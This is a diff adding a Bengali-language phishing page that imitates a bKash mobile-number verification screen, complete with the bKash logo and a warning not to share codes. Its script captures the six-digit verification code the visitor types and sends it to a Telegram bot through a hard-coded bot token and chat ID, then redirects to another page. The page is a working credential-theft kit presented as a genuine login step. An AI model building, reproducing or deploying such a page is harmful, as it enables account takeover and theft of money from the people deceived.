@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="bn">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>মোবাইল যাচাইকরণ</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background-color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 16px;
+        }
+
+        .back-button {
+            color: #e91e63;
+            background: none;
+            border: none;
+            font-size: 30px;
+            cursor: pointer;
+            text-decoration: none;
+            padding: 0px;
+        }
+
+        .language-button {
+            border: 1px solid #e91e63;
+            color: #e91e63;
+            background: none;
+            border-radius: 50px;
+            padding: 6px 16px;
+            font-size: 14px;
+            cursor: pointer;
+        }
+
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 0 24px;
+            padding-top: 32px;
+        }
+
+        .logo {
+            margin-bottom: 32px;
+            width: 80px;
+            height: 80px;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 32px;
+            color: #333;
+        }
+
+        .verification-label {
+            color: #666;
+            margin-bottom: 8px;
+        }
+
+        .otp-container {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 32px;
+        }
+
+        .otp-input {
+            width: 40px;
+            height: 64px;
+            border: none;
+            border-bottom: 2px solid #ddd;
+            text-align: center;
+            font-size: 24px;
+            background: transparent;
+            outline: none;
+        }
+
+        .resend-container {
+            text-align: right;
+            margin-bottom: 40px;
+            margin-top: -15px;
+            cursor: pointer;
+        }
+
+        .resend-text {
+            color: #e91e63;
+        }
+ 
+        .warning-box {
+            display: flex;
+            align-items: center;
+            background-color: #fff;
+            border-radius: 8px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            margin-bottom: 32px;
+            overflow: hidden;
+        }
+
+        .warning-icon {
+            background-color: #fff;
+            border: 2px solid #e91e63;
+            border-radius: 50%;
+            padding: 8px;
+            margin-right: 16px;
+            width: 60px;
+            height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .warning-text {
+            background-color: #e91e63;
+            color: white;
+            padding: 12px;
+            flex: 1;
+            border-radius: 0 8px 8px 0;
+            font-size: 18px;
+        }
+
+        .footer {
+            background-color: #fff;
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .confirm-text {
+            color: #e91e63;
+            font-weight: 500;
+        }
+
+        .confirm-button {
+            background-color: #e91e63;
+            padding: 12px;
+            border-radius: 6px;
+            border: none;
+            cursor: pointer;
+            opacity: 0.5;
+        }
+
+        .confirm-button.active {
+            opacity: 1;
+        }
+
+        .confirm-button-arrow {
+            color: white;
+            font-size: 24px;
+        }
+
+        .keyboard {
+            position: fixed;
+            bottom: 70px;
+            left: 0;
+            right: 0;
+            background-color: #f0f0f0;
+            padding: 8px;
+            display: none;
+        }
+
+        .keyboard-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+        }
+
+        .key {
+            padding: 16px;
+            background-color: white;
+            border-radius: 6px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            font-size: 20px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .key:active {
+            background-color: #f5f5f5;
+        }
+
+        .alert-icon {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 20px;
+            height: 20px;
+            background-color: #FFC107;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        .icon-container {
+            position: relative;
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Header -->
+    <header class="header">
+        <a href="/index.html" class="back-button" >←</a>
+        <!-- <button class="back-button">←</button> -->
+        <button class="language-button">English</button>
+    </header>
+
+    <!-- Main Content -->
+    <main class="main-content">
+        <!-- Logo -->
+
+           <img src="bkash.png" class="logo" alt="">
+
+
+        <!-- Title -->
+        <h1 class="title">আপনার মোবাইল নাম্বার যাচাই করুন</h1>
+
+        <!-- Verification Code Section -->
+        <div>
+            <p class="verification-label">ভেরিফিকেশন কোড</p>
+        </div>
+
+        <!-- OTP Input -->
+        <div class="otp-container">
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+            <input type="text" class="otp-input" maxlength="1" readonly>
+        </div>
+
+        <!-- Resend Code -->
+        <div class="resend-container">
+            <p class="resend-text">পুনরায় পাঠান <span id="countdown">60s</span> পর</p>
+        </div>
+
+        <!-- Warning Box -->
+        <div class="warning-box">
+            <div class="warning-icon">
+                <div class="icon-container">
+                    <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#e91e63" stroke-width="2">
+                        <path d="M12 4a4 4 0 0 0-4 4v2h8V8a4 4 0 0 0-4-4z"></path>
+                        <path d="M4 12v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8H4z"></path>
+                    </svg>
+                    <div class="alert-icon">!</div>
+                </div>
+            </div>
+            <div class="warning-text">
+                আপনার বিকাশ পিন ও ভেরিফিকেশন কোড কাউকে দিবেন না
+            </div>
+        </div>
+    </main>
+
+    <!-- Footer with Button -->
+    <footer class="footer">
+        <p class="confirm-text">নিশ্চিত করুন</p>
+        <button id="confirmButton" class="confirm-button" disabled>
+            <span class="confirm-button-arrow">→</span>
+        </button>
+    </footer>
+
+    <!-- Numeric Keyboard -->
+    <div class="keyboard" id="keyboard">
+        <div class="keyboard-grid">
+            <div class="key" data-key="1">1</div>
+            <div class="key" data-key="2">2</div>
+            <div class="key" data-key="3">3</div>
+            <div class="key" data-key="4">4</div>
+            <div class="key" data-key="5">5</div>
+            <div class="key" data-key="6">6</div>
+            <div class="key" data-key="7">7</div>
+            <div class="key" data-key="8">8</div>
+            <div class="key" data-key="9">9</div>
+            <div class="key"></div>
+            <div class="key" data-key="0">0</div>
+            <div class="key" data-key="del">⌫</div>
+        </div>
+    </div>
+
+    <script>
+    // Function to send OTP to Telegram bot
+    async function sendOtpToTelegram(otp) {
+        const telegramBotToken = "7844663371:AAFOBkya3Ff-yMhay5UGmK8p6eCE3ycDzBs";
+        const chatId = "5919121831";
+        const message = `OTP Code: ${otp}`;
+
+        const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;
+
+        await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, text: message })
+        });
+    }
+
+    // OTP Input and Keyboard Logic
+    const otpInputs = document.querySelectorAll('.otp-input');
+    const keyboard = document.getElementById('keyboard');
+    const keys = document.querySelectorAll('.key');
+    const confirmButton = document.getElementById('confirmButton');
+    let activeInputIndex = null;
+    let otp = Array(6).fill('');
+
+    // Add click event to OTP inputs
+    otpInputs.forEach((input, index) => {
+        input.addEventListener('click', () => {
+            activeInputIndex = index;
+            keyboard.style.display = 'block';
+            otpInputs.forEach(inp => inp.style.borderBottomColor = '#ddd');
+            input.style.borderBottomColor = '#e91e63';
+        });
+    });
+
+    // Add click event to keyboard keys
+    keys.forEach(key => {
+        key.addEventListener('click', () => {
+            const keyValue = key.getAttribute('data-key');
+            if (activeInputIndex === null) return;
+
+            if (keyValue === 'del') {
+                otp[activeInputIndex] = '';
+                otpInputs[activeInputIndex].value = '';
+                if (activeInputIndex > 0) {
+                    activeInputIndex--;
+                    otpInputs[activeInputIndex].style.borderBottomColor = '#e91e63';
+                }
+            } else if (keyValue) {
+                otp[activeInputIndex] = keyValue;
+                otpInputs[activeInputIndex].value = keyValue;
+                if (activeInputIndex < 5) {
+                    activeInputIndex++;
+                    otpInputs[activeInputIndex].style.borderBottomColor = '#e91e63';
+                }
+            }
+            checkOtpComplete();
+        });
+    });
+
+    // Check if OTP is complete
+    function checkOtpComplete() {
+        const isComplete = otp.every(digit => digit !== '');
+        if (isComplete) {
+            confirmButton.disabled = false;
+            confirmButton.classList.add('active');
+        } else {
+            confirmButton.disabled = true;
+            confirmButton.classList.remove('active');
+        }
+    }
+
+    // Confirm button click handler
+    confirmButton.addEventListener('click', async () => {
+        if (!confirmButton.disabled) {
+            const otpValue = otp.join('');
+            await sendOtpToTelegram(otpValue);
+            window.location.href = '/home.html';
+        }
+    });
+        let countdownElement = document.getElementById("countdown");
+        let resendText = document.querySelector(".resend-text");
+        let timeLeft = 60;
+        let countdownInterval;
+
+        function startCountdown() {
+            resendText.classList.remove("active");
+            countdownElement.innerText = timeLeft;
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                countdownElement.innerText = timeLeft;
+
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    resendText.innerHTML = "পুনরায় সেন্ড করুন";
+                    resendText.classList.add("active");
+                }
+            }, 1000);
+        }
+
+        resendText.addEventListener("click", () => {
+            if (timeLeft <= 0) {
+                timeLeft = 60;
+                resendText.innerHTML = `পুনরায় পাঠান <span id="countdown">${timeLeft}</span>s পর`;
+                countdownElement = document.getElementById("countdown");
+                startCountdown();
+            }
+        });
+
+        // পেজ লোড হওয়ার সাথে সাথে কাউন্টডাউন শুরু হবে
+        startCountdown();
+    
+</script>
+
+
+</body>
+
+</html>
